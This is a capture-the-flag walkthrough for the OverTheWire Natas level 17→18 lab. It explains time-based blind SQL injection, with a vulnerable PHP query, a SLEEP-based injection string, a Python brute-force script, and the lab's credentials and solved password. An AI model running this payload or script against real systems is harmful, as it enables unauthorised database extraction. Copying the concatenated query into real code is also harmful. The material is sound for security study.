# Natas Level 17 → 18

## Goal

Blind SQL injection again — but this time the app's output is **completely silent** about whether your query matched. Use **time-based** inference: make the server `SLEEP` for several seconds when your guess is right.

## Concepts you'll learn

- **Time-based blind SQLi** — when there's no true/false indicator in the response, use wall-clock time as a side-channel
- MySQL's `SLEEP(N)` function inside a conditional (`IF(...)`)
- Automating with Python and timing each request

## Walkthrough

### 1. View the source

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    // nothing is printed regardless
}
```

The response never changes. You need a side-channel.

### 2. Craft a timing probe

```
natas18" AND IF(SUBSTRING(password,1,1)="a", SLEEP(5), 0) AND username="natas18
```

SQL built from that:

```sql
SELECT * from users where username="natas18"
 AND IF(SUBSTRING(password,1,1)="a", SLEEP(5), 0)
 AND username="natas18"
```

If the password's first character is `a`, `SLEEP(5)` runs and the request takes ~5 seconds. Otherwise it returns instantly.

### 3. Automate

```python
import requests, time
from requests.auth import HTTPBasicAuth

URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""
while True:
    found = None
    for c in CHARS:
        payload = f'natas18" AND IF(SUBSTRING(password,{len(password)+1},1)=BINARY "{c}", SLEEP(3), 0) AND username="natas18'
        t0 = time.time()
        requests.post(URL, data={"username": payload}, auth=AUTH, timeout=10)
        dt = time.time() - t0
        if dt >= 2.5:
            found = c
            break
    if not found:
        break
    password += found
    print(password)
```

This runs much slower than levels 15/16 (each confirmed character takes ~3 seconds), so expect several minutes. Eventually:

```
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## The answer

The password for `natas18` is:

**`xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas17.natas.labs.overthewire.org/>
